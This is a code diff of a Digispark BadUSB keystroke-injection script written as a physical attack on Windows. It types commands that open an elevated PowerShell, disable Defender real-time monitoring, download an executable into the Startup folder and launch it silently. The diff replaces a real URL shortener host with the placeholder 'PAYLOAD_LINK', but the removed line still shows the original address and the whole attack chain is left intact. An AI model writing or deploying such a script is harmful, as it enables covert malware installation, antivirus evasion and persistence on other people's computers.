@@ -17,7 +17,7 @@ DigiKeyboard.print("powershell -Command \"Start-Process powershell -Verb RunAs\"
     DigiKeyboard.delay(500);
   DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
       DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'https://2cm.es/QWj8' -OutFile '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\program.exe'\"");
+  DigiKeyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'PAYLOAD_LINK' -OutFile '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\program.exe'\"");
   DigiKeyboard.delay(500);
  DigiKeyboard.println("Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\program.exe\" -ArgumentList \"/silent\"");
     DigiKeyboard.delay(200);
